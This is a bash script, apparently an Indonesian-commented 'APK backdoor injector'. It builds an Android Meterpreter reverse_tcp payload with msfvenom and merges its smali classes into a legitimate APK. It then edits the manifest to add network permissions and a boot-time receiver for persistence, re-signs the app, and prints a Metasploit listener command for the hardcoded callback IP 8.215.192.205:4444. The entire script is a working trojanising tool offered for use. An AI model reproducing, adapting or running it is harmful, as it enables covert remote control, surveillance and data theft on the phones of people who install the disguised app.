#!/bin/bash

# =============================================
# APK BACKDOOR INJECTOR - OPTIMIZED VERSION
# =============================================

# --- KONFIGURASI WAJIB ---
APK_INPUT="${1:-original.apk}"  # Bisa pakai argumen atau default
LHOST="8.215.192.205"           # IP server Anda (WAJIB diubah jika berbeda)
LPORT="4444"                    # Port listener
OUTPUT_SUFFIX="_injected"       # Format nama output

# --- KONFIGURASI TEKNIS ---
WORKDIR=$(mktemp -d -p "$(pwd)" apk_work_XXXXXX)
TOOL_DIR="$HOME/.apk_tools"
LOG_FILE="apk_mod_$(date +%Y%m%d_%H%M%S).log"
KEYSTORE="$TOOL_DIR/debug.keystore"
APK_OUTPUT="${APK_INPUT%.*}${OUTPUT_SUFFIX}.apk"

# --- FUNGSI UTAMA ---

validasi_environment() {
    echo "[*] Memvalidasi environment..." | tee -a "$LOG_FILE"
    
    # Cek konektivitas IP:PORT
    echo "[*] Mengecek koneksi ke $LHOST:$LPORT..." | tee -a "$LOG_FILE"
    if ! nc -zvw 3 "$LHOST" "$LPORT" &>> "$LOG_FILE"; then
        echo "[!] Peringatan: Tidak bisa terkoneksi ke $LHOST:$LPORT" | tee -a "$LOG_FILE"
        read -p "Lanjutkan tanpa tes koneksi? (y/n) " -n 1 -r
        echo
        [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
    fi

    # Cek file APK
    if [ ! -f "$APK_INPUT" ]; then
        echo "[X] File APK tidak ditemukan: $APK_INPUT" | tee -a "$LOG_FILE"
        exit 1
    fi

    # Cek tools esensial
    declare -A REQUIRED_TOOLS=(
        ["apktool"]=""
        ["msfvenom"]=""
        ["jarsigner"]=""
        ["zipalign"]=""
        ["keytool"]=""
    )

    for tool in "${!REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" &>> "$LOG_FILE"; then
            echo "[X] Tool '$tool' tidak terinstall" | tee -a "$LOG_FILE"
            exit 1
        fi
    done
}

setup_keystore() {
    echo "[*] Menyiapkan keystore..." | tee -a "$LOG_FILE"
    
    if [ ! -f "$KEYSTORE" ]; then
        keytool -genkey -v -keystore "$KEYSTORE" \
        -alias androiddebugkey -storepass android -keypass android \
        -keyalg RSA -keysize 4096 -validity 10000 \
        -dname "CN=Android Debug,O=Android,C=US" &>> "$LOG_FILE"
    fi
}

handle_protected_apk() {
    echo "[*] Memeriksa proteksi APK..." | tee -a "$LOG_FILE"
    
    # Hapus signature lama
    echo "[*] Menghapus signature lama..." | tee -a "$LOG_FILE"
    zip -d "$APK_INPUT" 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*.DSA' &>> "$LOG_FILE"
    
    # Cek native library
    if unzip -l "$APK_INPUT" | grep -q 'lib/.*\.so'; then
        echo "[!] APK mengandung native library (.so)" | tee -a "$LOG_FILE"
    fi
}

inject_payload() {
    echo "[*] Menyuntikkan payload..." | tee -a "$LOG_FILE"
    
    # 1. Buat payload
    msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
    -o "$WORKDIR/payload.apk" &>> "$LOG_FILE"
    
    # 2. Dekompilasi kedua APK
    apktool d -f "$APK_INPUT" -o "$WORKDIR/original" &>> "$LOG_FILE"
    apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" &>> "$LOG_FILE"
    
    # 3. Gabungkan smali
    cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" &>> "$LOG_FILE"
    
    # 4. Modifikasi Manifest
    MANIFEST="$WORKDIR/original/AndroidManifest.xml"
    sed -i '/<application/i \
    <uses-permission android:name="android.permission.INTERNET"/> \
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' "$MANIFEST"
    
    sed -i '/<\/application>/i \
    <service android:name="com.metasploit.stage.PayloadService" \
        android:exported="false" \
        android:permission="android.permission.BIND_JOB_SERVICE"/> \
    <receiver android:name="com.metasploit.stage.PayloadReceiver" \
        android:exported="false"> \
        <intent-filter> \
            <action android:name="android.intent.action.BOOT_COMPLETED"/> \
        </intent-filter> \
    </receiver>' "$MANIFEST"
}

build_apk() {
    echo "[*] Membangun APK..." | tee -a "$LOG_FILE"
    
    # 1. Rebuild
    apktool b "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" &>> "$LOG_FILE"
    
    # 2. Signing
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
    -keystore "$KEYSTORE" -storepass android -keypass android \
    "$WORKDIR/unsigned.apk" androiddebugkey &>> "$LOG_FILE"
    
    # 3. Zipalign
    zipalign -v 4 "$WORKDIR/unsigned.apk" "$APK_OUTPUT" &>> "$LOG_FILE"
}

# --- EKSEKUSI UTAMA ---
clear
echo "=== APK BACKDOOR INJECTOR ===" | tee -a "$LOG_FILE"
echo "LHOST: $LHOST" | tee -a "$LOG_FILE"
echo "LPORT: $LPORT" | tee -a "$LOG_FILE"
echo "Log File: $LOG_FILE" | tee -a "$LOG_FILE"

# Validasi awal
validasi_environment
setup_keystore

# Proses utama
handle_protected_apk
inject_payload
build_apk

# Hasil akhir
echo "[+] Selesai! APK termodifikasi: $APK_OUTPUT" | tee -a "$LOG_FILE"
echo "[*] Untuk menjalankan listener, gunakan perintah berikut:" | tee -a "$LOG_FILE"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run'" | tee -a "$LOG_FILE"

# Bersihkan
rm -rf "$WORKDIR"
